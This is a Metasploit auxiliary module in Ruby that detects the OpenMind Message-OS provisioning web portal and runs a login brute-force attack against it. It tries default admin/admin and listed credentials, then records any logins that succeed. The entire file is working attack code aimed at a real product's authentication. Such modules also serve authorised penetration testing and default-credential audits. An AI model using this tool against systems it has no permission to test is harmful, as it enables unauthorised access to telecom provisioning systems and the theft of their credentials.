##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'OpenMind Message-OS Portal Login Brute Force Utility',
      'Description'    => %{
        This module scans for OpenMind Message-OS provisioning web login portal, and
        performs a login brute force attack to identify valid credentials.
      },
      'Author'         =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
        ],
      'License'        => MSF_LICENSE

    ))

    register_options(
      [
        Opt::RPORT(8888),
        OptString.new('TARGETURI', [true, "URI for Web login", "/provision/index.php"]),
        OptString.new('USERNAME', [true, "A specific username to authenticate as", "admin"]),
        OptString.new('PASSWORD', [true, "A specific password to authenticate with", "admin"])
      ], self.class)
  end

  def run_host(ip)
    unless is_app_openmind?
      return
    end

    print_status("#{peer} - Starting login brute force...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  #
  # What's the point of running this module if the target actually isn't OpenMind
  #

  def is_app_openmind?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET'
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      vprint_error("#{peer} - HTTP Connection Failed...")
      return false
    end

    if (res and res.code == 302 and res.headers['Location'] and res.headers['Location'].include?("/provision/index.php"))
      vprint_good("#{peer} - Running OpenMind Message-OS Provisioning portal...")
      return true
    else
      vprint_error("#{peer} - Application is not OpenMind. Module will not continue.")
      return false
    end
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    vprint_status("#{peer} - Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi(
      {
        'uri'       => target_uri.to_s,
        'method'    => 'POST',
        'vars_post' =>
          {
            'f_user' => user,
            'f_pass' => pass
          }
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("#{peer} - HTTP Connection Failed...")
      return :abort
    end

    if (res and res.code == 302 and res.headers['Location'].include?("frameset"))
      print_good("#{peer} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
      report_hash = {
        :host   => rhost,
        :port   => rport,
        :sname  => 'OpenMind Message-OS Provisioning Portal',
        :user   => user,
        :pass   => pass,
        :active => true,
        :type => 'password'
      }
      report_auth_info(report_hash)
      return :next_user
    else
      vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
    end

  end
end
